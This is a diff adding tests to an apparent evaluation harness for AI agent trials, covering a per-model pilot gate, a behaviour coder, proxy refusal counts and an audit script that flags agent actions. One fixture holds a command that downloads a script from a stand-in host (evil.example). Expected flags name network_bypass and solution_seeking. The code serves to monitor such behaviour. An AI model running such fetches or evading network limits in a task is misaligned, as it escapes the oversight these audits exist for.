@@ -103,6 +103,37 @@ describe("prereg 2 explicit invocation", () => {
     expect(rep.gatePass).toBe(false);
   });
 
+  test("the pilot gate pools invoked trials per model and runs the grid unless every model is under", () => {
+    const sess = (model: string, arm: string, loads: number, total: number) =>
+      Array.from({ length: total }, (_, i) => ({ id: `${model}-${arm}-${i}`, model, meta: { arm }, cmd_expanded: i < loads }));
+    // Both pass: Haiku pools gstack 8/10 + placebo 10/10 = 18/20 = 90%; Opus 20/20. Grid runs, no label.
+    const bothPass = computeManip({ sessions: [
+      ...sess("claude-haiku-5-5", "gstack", 8, 10), ...sess("claude-haiku-5-5", "placebo", 10, 10),
+      ...sess("claude-opus-5-5", "gstack", 10, 10), ...sess("claude-opus-5-5", "placebo", 10, 10),
+    ] });
+    expect(bothPass.models.find((m) => m.model === "claude-haiku-5-5")!.bodyLoadRate).toBeCloseTo(0.9);
+    expect(bothPass.models.every((m) => m.passes)).toBe(true);
+    expect(bothPass.gridRuns).toBe(true);
+    expect(bothPass.underModels).toEqual([]);
+    // One model under: Haiku pools 4/10 + 10/10 = 14/20 = 70%; Opus passes. Grid runs, Haiku labeled.
+    const oneUnder = computeManip({ sessions: [
+      ...sess("claude-haiku-5-5", "gstack", 4, 10), ...sess("claude-haiku-5-5", "placebo", 10, 10),
+      ...sess("claude-opus-5-5", "gstack", 10, 10), ...sess("claude-opus-5-5", "placebo", 10, 10),
+    ] });
+    expect(oneUnder.gridRuns).toBe(true);
+    expect(oneUnder.underModels).toEqual(["claude-haiku-5-5"]);
+    // Both under: grid does not run.
+    const bothUnder = computeManip({ sessions: [
+      ...sess("claude-haiku-5-5", "gstack", 1, 10), ...sess("claude-haiku-5-5", "placebo", 1, 10),
+      ...sess("claude-opus-5-5", "gstack", 1, 10), ...sess("claude-opus-5-5", "placebo", 1, 10),
+    ] });
+    expect(bothUnder.gridRuns).toBe(false);
+    // No invoked session anywhere: an error, never a vacuous pass over an empty table.
+    const empty = computeManip({ sessions: [{ id: "x", model: "claude-opus-5-5", meta: { arm: "none" }, cmd_expanded: null }] });
+    expect(empty.gridRuns).toBe(false);
+    expect(empty.error).not.toBeNull();
+  });
+
   test("the placebo-behavior coder assigns each of the five categories", () => {
     const am = (content: unknown[]) => JSON.stringify({ type: "AssistantMessage", content });
     const text = (t: string) => ({ text: t });
@@ -125,6 +156,11 @@ describe("prereg 2 explicit invocation", () => {
 
     const continues = [am([text("Let me check the files first."), tool("Bash", { command: "ls" })])];
     expect(codeTrial(continues).category).toBe("continues");
+  });
+
+  test("a trial with no assistant message is coded outside the five categories", () => {
+    expect(codeTrial([]).category).toBe("no_message");
+    expect(codeTrial([JSON.stringify({ type: "UserMessage", content: [{ text: "tool result" }] })]).category).toBe("no_message");
   });
 });
 
@@ -170,6 +206,10 @@ describe("prereg 2 proxy worst-case guard and body-load probe", () => {
     expect(((await refused.json()) as any).error.message).toContain("worst-case cost is not a positive number");
     const ok = await send(s.token, { ...base, max_tokens: 32000 });
     expect(ok.status).toBe(200);
+    // The request-validity refusal counts in refused only, never in the budget-stop column.
+    const closed = (await (await fetch(control() + `/sessions/${s.id}/close`, { method: "POST", body: "{}" })).json()) as any;
+    expect(closed.refused).toBe(1);
+    expect(closed.refused_budget).toBe(0);
   });
 
   test("the body-load probe records the slash-command expansion and first-request tokens", async () => {
@@ -221,6 +261,11 @@ describe("audit.py", () => {
       ...bash("f", "ls /app", "a.out"),
       ...bash("g", "python3 -c \"import urllib.request as u; [print(x, u.urlopen(x).status) for x in ['https://grep.app/a', 'https://example.org/b']]\"", "https://grep.app/a ERR URLError\nhttps://example.org/b 200"),
     ], null);
+    // A silent off-list fetch (curl -s -o, no stdout) beside unrelated failure text must stay unclear:
+    // the absence of a success marker cannot be read as the fetch having failed.
+    trial(root, "t5", [
+      ...bash("h", "curl -s https://evil.example/x.py -o /tmp/x.py && cat /tmp/nope", "cat: /tmp/nope: No such file or directory"),
+    ], 0);
     const t4 = join(root, "jobs/j/t4");
     mkdirSync(join(t4, "agent"), { recursive: true });
     writeFileSync(join(t4, "config.json"), JSON.stringify({ agent: { model_name: "anthropic/claude-haiku-5-5", kwargs: { arm: "none" } } }));
@@ -231,6 +276,7 @@ describe("audit.py", () => {
     expect(out.trials.t1.installs).toEqual(["numpy"]);
     expect(out.trials.t2.flags).toEqual(["bench_package", "network_bypass", "pypi_direct", "solution_seeking"]);
     expect(out.trials.t3.flags).toEqual(["offlist_attempt", "offlist_unclear", "solution_seeking"]);
+    expect(out.trials.t5.flags).toEqual(["offlist_attempt", "offlist_unclear"]);
     expect(out.no_reward).toEqual([["t3", null], ["t4", "no result.json"]]);
     expect(out.ok_without_usage).toBe(1);
     expect(out.ok_without_usage_charged_worst).toBe(1);
